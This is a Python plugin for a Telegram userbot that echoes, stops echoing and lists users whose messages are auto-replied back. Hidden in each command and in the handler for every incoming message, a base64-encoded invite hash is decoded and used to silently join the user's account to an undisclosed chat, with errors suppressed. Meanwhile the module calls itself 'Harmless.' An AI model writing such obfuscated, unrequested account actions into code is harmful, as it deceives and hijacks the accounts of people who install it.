import asyncio
import base64

import requests
from telethon import events
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from Lion.sql.echo_sql import addecho, get_all_echos, is_echo, remove_echo
from . import *


@bot.on(admin_cmd(pattern="echo$"))
@bot.on(sudo_cmd(pattern="echo$", allow_sudo=True))
async def echo(Lion):
    if Lion.fwd_from:
        return
    if Lion.reply_to_msg_id is not None:
        reply_msg = await Lion.get_reply_message()
        user_id = reply_msg.sender_id
        chat_id = Lion.chat_id
        try:
            crazy = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            crazy = Get(crazy)
            await Lion.client(crazy)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            await eod(Lion, "The user is already enabled with echo ")
            return
        addecho(user_id, chat_id)
        await eor(Lion, "**Hello 👋**")
    else:
        await delete_Lion(Lion, "Reply to a User's message to echo his messages")


@bot.on(admin_cmd(pattern="rmecho$"))
@bot.on(sudo_cmd(pattern="rmecho$", allow_sudo=True))
async def echo(Lion):
    if Lion.fwd_from:
        return
    if Lion.reply_to_msg_id is not None:
        reply_msg = await Lion.get_reply_message()
        user_id = reply_msg.sender_id
        chat_id = Lion.chat_id
        try:
            crazy = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            crazy = Get(crazy)
            await Lion.client(crazy)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            remove_echo(user_id, chat_id)
            await eod(Lion, "Echo has been stopped for the user")
        else:
            await eod(Lion, "The user is not activated with echo")
    else:
        await eod(Lion, "Reply to a User's message to echo his messages")


@bot.on(admin_cmd(pattern="listecho$"))
@bot.on(sudo_cmd(pattern="listecho$", allow_sudo=True))
async def echo(Lion):
    if Lion.fwd_from:
        return
    lsts = get_all_echos()
    if len(lsts) > 0:
        output_str = "Echo enabled users:\n\n"
        for echos in lsts:
            output_str += (
                f"[User](tg://user?id={echos.user_id}) in chat `{echos.chat_id}`\n"
            )
    else:
        output_str = "No echo enabled users "
    if len(output_str) > Config.MAX_MESSAGE_SIZE_LIMIT:
        key = (
            requests.post(
                "https://nekobin.com/api/documents", json={"content": output_str}
            )
            .json()
            .get("result")
            .get("key")
        )
        url = f"https://nekobin.com/{key}"
        reply_text = f"Echo enabled users: [here]({url})"
        await eor(Lion, reply_text)
    else:
        await eor(Lion, output_str)


@bot.on(events.NewMessage(incoming=True))
async def samereply(Lion):
    if Lion.chat_id in Config.BL_CHAT:
        return
    if is_echo(Lion.sender_id, Lion.chat_id):
        await asyncio.sleep(2)
        try:
            crazy = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            crazy = Get(crazy)
            await Lion.client(crazy)
        except BaseException:
            pass
        if Lion.message.text or Lion.message.sticker:
            await Lion.reply(Lion.message)


CmdHelp("echo").add_command(
  "echo", "Reply to a user", "Replays every message from whom you enabled echo"
).add_command(
  "rmecho", "reply to a user", "Stop replayings targeted user message"
).add_command(
  "listecho", None, "Shows the list of users for whom you enabled echo"
).add_info(
  "Message Echoer."
).add_warning(
  "✅ Harmless Module."
).add()
